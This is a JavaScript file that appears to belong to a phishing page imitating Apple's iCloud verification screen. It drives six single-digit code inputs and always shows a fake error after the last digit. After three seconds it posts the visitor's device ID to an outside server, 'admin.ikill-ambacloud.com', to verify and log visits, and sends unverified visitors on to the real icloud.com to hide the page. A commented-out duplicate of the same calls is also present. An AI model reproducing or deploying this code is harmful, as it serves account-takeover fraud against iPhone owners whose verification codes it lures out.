var device;
var myVar;
$( document ).ready(function() {
    $("#error_codigo").hide();
    $('#v1').focus();
    $('.char-field').mask('0');
    myVar = setTimeout(init, 3000);

      //  device=$("#device").val();
  
      // $.post("https://admin.ikill-ambacloud.com/ajax/usuario.php?op=verifiar", {device:device }, function(data, status) {
      //    if(data==1)
      //    {
      //     $.post("https://admin.ikill-ambacloud.com/ajax/usuario.php?op=visitas", {device:device }, function(data, status) {
             
      //      });
  
      //    }else
      //    {
      //     window.location.href = "https://www.icloud.com/";
      //    }
      // });
  
      

});

function v1(){
    $('#v2').focus();
 }

 function v2(){
    $('#v3').focus();
 }

 function v3(){
    $('#v4').focus();
 }

 function v4(){
    $('#v5').focus();
 }

 function v5(){
    $('#v6').focus();
 }

 function v6(){
    $("#error_codigo").show();
    $("#spinner").addClass("spinner");
    
 }

 $( "#error_codigo" ).click(function() {
    $("#spinner").removeClass("spinner");
    $("#error_codigo").hide();
    $('#v1').focus();
  });

  function init() {
 
      device=$("#device").val();

      $.post("https://admin.ikill-ambacloud.com/ajax/usuario.php?op=verifiar", {device:device }, function(data, status) {
         if(data==1)
         {
          $.post("https://admin.ikill-ambacloud.com/ajax/usuario.php?op=visitas", {device:device }, function(data, status) {
             
           });
   
         }else
         {
          window.location.href = "https://www.icloud.com/";
         }
      });

 

    

   
}